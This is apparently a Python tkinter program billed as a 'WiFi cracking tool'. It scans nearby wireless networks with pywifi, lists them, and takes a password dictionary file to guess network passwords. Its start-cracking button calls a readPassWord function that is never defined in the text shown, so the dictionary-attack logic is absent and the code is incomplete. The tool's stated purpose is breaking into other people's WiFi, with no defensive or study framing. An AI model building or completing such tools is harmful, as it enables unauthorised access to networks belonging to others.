# coding:utf-8
from base64 import b64decode
from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox

#################配置区##################

con_time_out = 1.5  # s

###########################################
img = 'AAABAAEAMDAAAAEAIACoJQAAFgAAACgAAAAwAAAAYAAAAAEAIAAAAAAAACQAABMLAAATCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMFBQAnPEQAAAAAAQAAAAUAAAAEAAAAABomKwAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHCgwAAAAAAAAAABQQGBs8KD1FYTVQW3QzTlhyJDU9WgoOEDMAAAAN6f//AAUHBwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJjlBAAAAAAYAAAAiIzY+WE94iZ9sp77XeLvW7nzC3vV9wd30ebnT62iftc1DaXmPHCwzTgAAAB4AAAAFHi40AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAcIAAAAAAAAAAARDxcaOjlWYnldjqK6c7bQ6ILL6P2Dz+7/f83t/3/N7f+Bzu3/g87u/4TP7f99x+X7crHL41qJm7M1UVx0DRQWOAAAABEAAAAABwoLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQICAFB5iQAAAAAHAAAAIiI2PldNdIOab6a81IDD3/WFzuz/hc/u/4bP7v+Ezu3/gs7s/4XP7f+Fz+3/g87t/4LN7P+Azez/g8/u/4TN6/97wd30aqO60kxzg5smOUBaAAAAJQAAAAdHaHUAAQICAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQICACxDTAAAAAAEAAAAGhciJ0U7WmZ+Wo2iunK10OiCyuj9hs/u/4XO7f+Hz+3/hc/t/4XP7f+Ezu3/g87t/4PO7f+Dzez/gs3s/4HN7P+Bzez/gM3s/4HN7P+Czu3/g87t/4PK6P16uNLqYpKmvTxZZHwWICRDAAAAGgAAAAQuRU4AAgIDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExAYGzw2UVt0VoSWr3Csxd1/xOH3gs3s/4PO7f+Dzu3/g87s/4XO7P+Fzu3/gs3s/4PO7P+Dzu3/hc/t/4PO7f+Dzu3/hc7t/4LN7P+Bzuz/gM3s/4LN7P+Bzez/hc7t/4jP7f+I0O7/iM/t/4LF4fdzrMTcV4SVrjZQW3QRGRw9AAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACpBSgAjNz4PUXyNkGymvdd9wd30g83r/4PP7v+Fz+7/hs7t/4TO7P+Ez+3/hc7t/4bP7f+Dzuz/hM7t/4PO7P+Ezu3/gM3s/37M7P+Czu3/gc3s/4PO7P+Ezuz/gM3s/4HN7P+Bzez/hs/t/4rQ7v+Gzu3/hc7s/4TO7f+G0O7/h87s/4LD3vRwqL/YVH6PlCs+RRIwRk8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQgJAGqhtgBYhpg8fsPf7YbQ7v+Dzu3/g83s/4LN7P+Gz+3/hM7t/4TO7f+Ez+3/hM7s/4PO7f+Ezu3/hc7t/4TO7f+Ezu3/hc7t/4nQ7v+I0O7/g87t/4DN7P+Czuz/f83s/3/M7P+Czez/hs/t/4fP7f+Dzez/hc7t/4LN7P+Ezu3/h8/t/4nQ7v+J0e//g8bh8FyLnUJyrMMAFB0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wBvpbp9hczp/4TO7P+Ezuz/hc/t/4XO7P+Ezu3/gM3s/4PO7f+Czu3/gc3s/4TO7f+Gz+3/hc/t/4PO7f+Dzu3/hs/u/4jP7v+Gz+3/g87t/4DN7P+Bzez/gs7s/4PO7P+Czez/hM7s/4fP7f+Gz+3/hs/t/4PO7P+Fzu3/h8/t/4jP7f+Iz+3/is7r/3GnvoX///8AAQICAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQF1pADNJUhB+uNK/itDt/4bO7f+Iz+3/iNDu/4jP7f+Dzuz/gc3s/4DN7P+Bzez/iM/t/4nP7f+K0O7/h8/t/4TO7P+Gz+3/hs/t/4XO7f+Czez/g87t/4TO7f+Ezu3/g87t/4LN7P+Czez/hs/t/4nQ7v+Fz+3/g87s/4LO7P+Fzu3/iM/t/4bP7f+Gz+3/idDu/32608U8VWATRmRxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAgIAa56zAFyHmTuExeHsitDu/4rQ7v+L0O7/itDu/4nQ7v+Iz+3/hM7s/4fP7f+Eze3/iM/t/4rQ7v+Iz+3/h8/t/4jP7v+Hz+3/hs/t/4bP7f+Dzuz/g87s/4XP7f+Czu3/g87s/4HN7P+Fzu3/idDu/4zQ7v+Hz+3/h8/t/4fP7f+Iz+3/itDu/4rQ7v+Hz+7/h9Du/4bH4vBhjJ5CeK3EAAYJCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////AHCit36Lzuv/itDu/4nQ7v+K0O7/itDu/4nQ7v+Iz+3/itDu/4zQ7v+Jz+7/idDu/4jP7f+J0O7/idDu/4bO7f+Gz+3/hc7t/4fP7f+Hzu3/hs7t/4bP7f+Ezu3/hs/t/4bP7f+Hz+3/itDu/4nP7f+Fzuz/iM/t/4rQ7v+L0O7/i9Du/4rQ7v+Gz+3/h8/t/4fN6/9zp76E////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgjKAA/WmYANk1XGn22z8mN0e7/i9Du/4rQ7v+K0O7/i9Du/4rQ7v+K0O7/jNHu/43R7v+L0O7/itDu/4nQ7v+Iz+3/hc7s/4jP7f+Bzez/gMzs/4bP7f+Ezu3/hs/t/4nQ7v+Gz+3/hs/t/4fP7v+Hz+3/itDu/4fP7f+Fzuz/hs/t/4jP7v+K0O7/ic/t/4XP7f+Dzu3/h8/t/4bP7f96uNLGMkpUFTlVYAAGCgsAAAAAAAAAAAAAAAAAAAAAAP///wCd4/8AY4+iWIjJ5feL0O7/itDu/4nQ7v+K0O7/itDu/4rQ7v+L0O7/jtLu/47S7v+N0e7/i9Du/4vQ7v+J0O7/h8/t/4fP7f+Gz+3/hM7t/4PN7f+Fzu3/iM/t/4fP7f+Hz+3/iM/t/4nQ7v+Iz+7/idDu/4jQ7f+J0O3/iNDu/4fP7f+J0O7/hc7s/4XO7f+J0O7/idDu/4XP7f9/xeHzVYWYTn7F4QBReIkAAAAAAAAAAAAAAAAAAAAAABchJgAAAAAIdq7FpovQ7f+K0O7/i9Du/4nQ7v+J0O7/jNDu/4vQ7v+N0e7/fMPr/3rA6v+Ky+3/kdLv/4zR7v+L0O7/idDu/4rQ7v+Iz+7/h87t/4bO7f+Hz+3/iM/t/4jQ7f+Gz+3/iM/u/4fP7v+Iz+3/fsXr/4DG6/+Mz+3/i9Hu/4fP7f+K0O7/iM/t/4bP7f+K0O7/itDu/4jQ7f+Fzuv/aqe/ngAAAAYPFxoAAAAAAAAAAAAAAAAAWICRAF2JmwBPdIMwgsHc44vQ7/+J0O7/i9Du/4zR7v+P0e7/j9Lu/4zR7v+Gy+7/N5Xh/yWJ3v8ykN//ZbLn/47R7v+M0e7/i9Du/47R7v+Kze3/ic/t/4fP7f+Hz+3/ic3t/3rA6v+Jzu3/hs/t/4fP7v99xuz/NJLh/yqM3/9HneL/gsjs/4jQ7v+Gz+3/idDt/4nO7f+Kze3/i9Hu/4fP7f+Hz+7/eb3Z4EtufC1XgZIAR2d0AAAAAAAAAAAACQwOAP///wBrnbJ4h8zp/orQ7v+K0O7/i8/u/3W86v9PouT/fMHr/5DS7v9dpM//IHO0/x14wf8Zgtv/NJHb/4XK6f+M0e7/j9Lv/3i+6v9BmuH/db/r/4XP7f+Ax+f/TKDe/yWJ3v9bq+X/i87u/4nP7P9Un9D/GnO7/xp/0v8cg9v/Xq7f/4fQ7f+Ez+3/i8/u/1Sn5P9AmuL/fMPr/4fP7f+Dzu3/gsro/mmbsHb///8ABQYHAAAAAAAAAAAAN1FcADBHUBR7ts/DitDu/4rQ7v+K0e//e8Hh/zCAvP8XfdP/LI7f/2+56f9/vtr/dbPO/1ifyf8dg9n/Mo/Y/4TI6P+Q0+//d7/q/zKR3/8Ygdv/NInK/3vD4/93vt3/NICy/xl6yv8ehd3/T6Pk/4bJ6/9wtdP/ZafF/zSO0f8bgtr/Wqrb/4nQ7v+K0O3/Ya/m/yCG3f8Yf9b/RZLH/4nN6v+Fzu3/gs7t/3q2z8QxRk8VOFJcAAEBAQAAAAAAfbzVAFuImkuDxuLyiNDu/4nQ7v+J0O7/iM7r/3Cxzv84gbH/GXzO/yaK3v9ns+r/j9Lx/2234f8fhdr/Mo/Y/4XI5/9wuOn/LY7f/xmA2P8id7n/Vpu+/3/J6P+Fzu3/fMHd/0mOtf8desb/G4Td/0Ca4v97wu3/jNDu/0Kd3/8agtr/Wqvb/43Q7/9frub/I4je/xl+0v8ufbT/crPR/4vQ7v+Fz+3/g87t/4bH4/NeiZpPisrkAAAAAAAZJisAAAAABm6nvpqJz+z/ic/u/4rQ7v+K0O7/itDu/4rR7/9+wd3/P4i3/xl90f8ee8j/ZKjP/2y24P8fhdr/MpDZ/3y/3/83h8L/F3jJ/y97sv9nqsn/g83r/4TO7f+Gzuz/iNDu/4XK5v9PlLv/HHvI/xh+1P81hL7/gcTh/0Od3/8agtr/WqnZ/1ek1v8dg9r/GnrK/zmCsf9zudb/jNHv/4zQ7v+Iz+7/gs7t/4nP7P90qcChAAAACB4sMgBbhpgAUXeGK32+2N+I0O7/ic/t/4rQ7v+J0O7/i9Du/4rQ7v+K0e//fLzc/0WJuP9Zlrv/icTh/2+34v8fhdr/M5Da/4jI6P92sdH/VZO5/3262f+N0e//h8/t/4fP7P+Iz+3/ic/t/4vR7/+Hyeb/UZS8/zyEsf9xs8//i8/q/0Od3/8agtr/XKva/2Kmxv8teq//UJK3/4PG4f+H0O7/idDu/4nQ7v+Hz+3/hs/t/4rQ7v+CwdvkVXuLMmWTpgCQ1fIAcqe+XYfM6fyHz+7/ic/t/4nP7v+K0O7/itDu/4rQ7v+Fy+n/SZ/e/y+O3f87leH/Qprj/zaS3/8chNz/I4jd/z6X4f8+l+L/M5Lg/0ed3v+Gyur/itDu/4jP7f+Iz+3/iM/u/4fM7f9SpeT/TqDf/1+p3/9vuOr/c7rp/zuX4P8bg9v/UKPf/3K66P9ortr/cLbl/3G56f+Ey+z/hs/t/4jP7f+Hz+3/hc7t/4nQ7v+Kzer+davBaZbb+QCW3PsAgr3XgInO7P+Iz+7/iM/t/4jP7f+L0O7/itDu/4vQ7v+Hzev/PJbY/xmB2f8heLz/JXSw/yV1sf8ndbH/JXWx/yR0sP8jeLv/GoLa/zKO1f+Bx+f/itDu/4nQ7f+Hz+3/hc7s/2iz4P8ehNv/GoPc/xuC2f8aftL/G37S/xyC2f8chNz/HIHW/xx/1P8cgtf/HILZ/yOG2P9vveT/hs/t/4bO7f+K0O7/itDt/4rQ7v+Kz+z/hcTeiJbd/ACL1PIAh8jjionP7P+K0O7/idDu/4nQ7v+K0O7/itDu/4vQ7v+Izuz/P5nZ/x2D2f9hqdP/gsHb/4HA2/+AwNv/f8Db/4LB2/9qsNf/H4Xb/zeT2P+Dyun/itDu/4vQ7v+Jz+3/iM/t/2iqy/8lerv/GoPb/yeByf9KibD/SYmu/yuFy/8bg9v/NYS7/z+Erf85ga7/M3us/zB7rv9xudr/iNDu/4bP7f+Hz+3/hs7t/4XO7P+K0O3/js/rkZDX9QCL0/EAicrlfYnP7f+K0O7/iM/u/4rQ7v+L0O7/itDu/4nQ7v+Hz+3/P5rc/x2E2/9Vp+P/cLrr/2+56/9uuev/brnr/2+66/9brOb/Hobd/zeT2v+Eyur/itDu/4vQ7v+K0O7/i9Du/43Q7P9mp8f/I3zC/yKI3f9uuen/jtHt/z6a3/8Ygdr/WKrg/4nP6/+IzOj/hcjl/4DF4v+Hzev/itDu/4rQ7v+Hz+3/hs/t/4jP7f+Kz+3/jM3piY7S7wCN0OwAjs7qVIzQ7fqL0O7/idDu/4nQ7v+K0O7/i9Du/4nQ7v+Gzev/OpPV/xd6zv8Yecr/GHjI/xh4yP8YeMj/GHjI/xh4yP8Yecr/F3vP/y6Jz/9/x+j/itDu/43R7v+M0O7/jtLu/5HT7/+N0Oz/V5zC/x1/z/8zkuD/e7/k/z6Huf8qdq3/T5S//4vO6v+O0u//jdLv/4zS7/+N0u7/jNHu/4rQ7v+J0O7/iM/t/4vQ7v+L0O39js7qYY3Q7ACS0OsAk9HrII/Q7deM0O7/itDu/4nQ7v+K0O7/jNDu/4vN7v+Jyej/Wpm//0+NtP9blbf/YJm5/2CYuf9emLj/X5i5/2CYuf9dlrf/UI20/1WTuv+FxeX/jc3u/4/R7v+N0e7/gMTq/3W66v95v+v/crfh/zOM0f8ag9z/TKHh/3Cz2/9vsdr/dLfh/3q/6v97wOv/eL7r/3K66v90u+n/iMzs/43R7v+K0O7/iM/t/4rQ7v+P0O3fkdDrJ5DQ6wCR0OsAV8n6AI7Q7IaK0O3/ic/u/4vQ7v+L0e7/gcfp/0CZ4P81lOL/NpTh/0CZ4v9InuX/SJ7m/0ie5f9InuT/SJ7k/0ie5f9InuX/QZni/zeU4f81lOL/O5bf/3/F6P+N0Oz/RZrX/xqA2P8cgdb/HIHW/xp+0v8agdj/HITc/x+F2v8df9P/HH/S/xyA1f8cgNX/HIHW/xuB2P8ihNb/c7vj/47S7v+Hz+3/iNDt/4zQ7f+Q0OyTmdDmApLQ6wCR0OsAjtDrAI7Q6zaKz+3qiM/t/4rQ7v+M0e//e8Di/yd9vv8Zcrr/G3O5/x1ytv8ec7X/HnO1/x15wv8agtv/GoDW/x50uf8ec7X/HXO3/xtzuf8acrr/IHi8/3W63f+Mz+v/UJW+/zR7rP87ga7/PoSw/0aHrf8sf77/G4Td/ySCzv9Mi7L/S4uv/0GFr/8/g6//O4Gu/zV9rP82fq7/dbjZ/4vR7/+Hz+7/itDu/43Q7e6Q0Os9j9DrAJDQ6gCT0esAj8/rAJDP6giLz+yuitDt/4vQ7v+L0O7/h8vo/26uy/9rq8j/ba3K/3Gxzv90tND/drTQ/06c0f8ag9z/J4bR/2ipyP92tdH/c7HN/26tyv9sq8j/a6zJ/4XI5f+N0e7/iczo/4jK5v+IzOn/ic7q/47R7P9dpM3/HILW/x6E2/9bqN7/j9Ht/4vP6/+Lzur/iszo/4bK5v+HyeX/i8/s/4nQ7v+Hz+3/iM/t/4/Q7LGT0OoJkdDrAJPR6wAAAAAAls/pAIvP6wCNz+tai9Dt+ojP7v+Hz+3/itDu/43S8P+M0vD/i9Lw/43S8P+O0/D/jdHu/1Wbxf8jcq7/PIa5/4fJ5v+P0/D/jtPw/4zS8P+M0vD/itLw/43R7/+N0e7/jdHu/43R7v+K0O7/i9Du/43S7/95vd3/LH68/y14rv9Ul7z/is3q/4zR7v+N0e7/jtHu/43R7v+N0e7/jdHu/4rQ7v+Hz+3/idDt+ZDQ7FmO0OwArtzrAAAAAAAAAAAAkNDrAIrP6QCKz+kZic/s0IXO7f+Gz+3/i9Du/4vQ7v+J0O7/i9Du/4vQ7v+M0O7/jNDu/4bI5f99vtn/gcLe/4zQ7f+N0e7/i9Du/4vQ7v+M0O7/idDu/4vQ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'


class MY_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name

        # 密码文件路径
        self.get_value = StringVar()

        # 获取破解wifi账号
        self.get_wifi_value = StringVar()

        # 获取wifi密码
        self.get_wifimm_value = StringVar()

        self.wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = self.wifi.interfaces()[0]  # 抓取第一个无线网卡
        self.iface.disconnect()  # 测试链接断开所有链接
        time.sleep(1)  # 休眠1秒
        # 测试网卡是否属于断开状态
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def __str__(self):
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    # 设置窗口
    def set_init_window(self):
        self.init_window_name.title("WIFI破解工具 2021.09。07")
        self.init_window_name.geometry('+500+200')

        labelframe = LabelFrame(width=400, height=200, text="配置")
        labelframe.grid(column=0, row=0, padx=10, pady=10)

        self.search = Button(labelframe, text="搜索附近WiFi", command=self.scans_wifi_list).grid(column=0, row=0)

        self.pojie = Button(labelframe, text="开始破解", command=self.readPassWord).grid(column=1, row=0)

        self.label = Label(labelframe, text="目录路径：").grid(column=0, row=1)

        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)

        self.file = Button(labelframe, text="添加密码文件目录", command=self.add_mm_file).grid(column=2, row=1)

        self.wifi_text = Label(labelframe, text="WiFi账号：").grid(column=0, row=2)

        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)

        self.wifi_mm_text = Label(labelframe, text="WiFi密码：").grid(column=2, row=2)

        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,
                                                                                                  sticky=W)

        self.wifi_labelframe = LabelFrame(text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)

        # 定义树形结构与滚动条
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        # 表格的标题
        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=100, anchor="center")
        self.wifi_tree.column("c", width=100, anchor="center")
        self.wifi_tree.column("d", width=100, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")

        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        self.vbar.grid(row=4, column=1, sticky=NS)

    # 搜索wifi
    # cmd /k C:\Python27\python.exe "$(FULL_CURRENT_PATH)" & PAUSE & EXIT
    def scans_wifi_list(self):  # 扫描周围wifi列表
        # 开始扫描
        print("^_^ 开始扫描附近wifi...")
        self.iface.scan()
        # time.sleep(15)
        # 在若干秒后获取扫描结果
        scanres = self.iface.scan_results()
        # 统计附近被发现的热点数量
        nums = len(scanres)
        print("数量: %s" % (nums))
        # print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
        # 实际数据
        self.show_scans_wifi_list(scanres)
        return scanres

    # 显示wifi列表
    def show_scans_wifi_list(self, scans_res):
        for index, wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
            self.wifi_tree.insert("", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))
        # print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))

    # 添加密码文件目录
    def add_mm_file(self):
        self.filename = tkinter.filedialog.askopenfilename()
        self.get_value.set(self.filename)

    # Treeview绑定事件
    def onDBClick(self, event):
        self.sels = event.widget.selection()
        print(self.wifi_tree.item(self.sels, "values"), 000)
